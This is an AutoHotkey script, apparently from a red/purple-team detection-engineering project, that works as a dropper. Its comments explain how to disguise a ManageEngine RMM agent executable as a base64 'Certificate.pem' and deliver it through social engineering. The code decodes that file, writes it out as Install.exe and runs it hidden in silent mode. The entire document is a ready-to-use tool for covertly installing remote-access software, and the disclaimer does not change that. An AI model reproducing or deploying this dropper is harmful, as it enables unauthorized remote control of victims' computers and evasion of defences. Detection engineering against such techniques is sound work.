; Test script for detection engineering related to RMM Central for AutoRMM project 
; See ReadMe.md
; For ethical red/purple team testing purposes only, following all laws and standards of ethical conduct.  
; Save this to a .ahk file extension. 
; Setup RMM Central from Manage Engine as a free trial. 
; Download the agent exe (see ReadMe.md)
; User CertUtil -encode to create a certificate file called Certificate.pem
; Place this ahk script and Certificate.pem in the same directory.
; Run the script (for AHK, compile to exe, run with AHK installed, or deliver both together with a wrapper script to “Run with” AHK.
; Follow the installation prompts / user interaction social engineering needed if using as part of a red team engagement. 

; 1) Locate the folder where this script lives
scriptFolder := A_ScriptDir

; 2) Read the PEM file
pemPath := scriptFolder . "\Certificate.pem"
if !FileExist(pemPath) {
    MsgBox("ERROR: Certificate.pem not found in " . scriptFolder, "Error", 16)
    ExitApp(1)
}

try {
    certText := FileRead(pemPath)
} catch as err {
    MsgBox("ERROR: Could not read Certificate.pem - " . err.Message, "Error", 16)
    ExitApp(1)
}

; 3) Strip the markers & whitespace
b64 := StrReplace(certText, "-----BEGIN CERTIFICATE-----", "")
b64 := StrReplace(b64, "-----END CERTIFICATE-----", "")
b64 := StrReplace(b64, "`r", "")
b64 := StrReplace(b64, "`n", "")
b64 := StrReplace(b64, " ", "")
b64 := Trim(b64)

; 4) Decode Base64 via MSXML
try {
    xmlDoc := ComObject("MSXML2.DOMDocument.6.0")
    nodeElem := xmlDoc.createElement("Base64Data")
    nodeElem.DataType := "bin.base64"
    nodeElem.Text := b64
    certBytes := nodeElem.nodeTypedValue
} catch as err {
    MsgBox("ERROR: Failed to decode Base64 - " . err.Message, "Error", 16)
    ExitApp(1)
}

; 5) Write binary out as Install.exe next to the script
savePath := scriptFolder . "\Install.exe"
try {
    stream := ComObject("ADODB.Stream")
    stream.Type := 1  ; adTypeBinary
    stream.Open()
    stream.Write(certBytes)
    stream.SaveToFile(savePath, 2)  ; adSaveCreateOverWrite
    stream.Close()
} catch as err {
    MsgBox("ERROR: Failed to write Install.exe - " . err.Message, "Error", 16)
    ExitApp(1)
}

; 6) Launch the EXE
try {
    ; Launch in hidden mode, silent install, no blocking
    Run('"' . savePath . '" /silent', , "Hide")
} catch as err {
    MsgBox("ERROR: Failed to launch Install.exe - " . err.Message, "Error", 16)
    ExitApp(1)
}

; Clean up is automatic in AHK v2 (COM objects are released when out of scope)
; Script completes successfully
ExitApp(0)
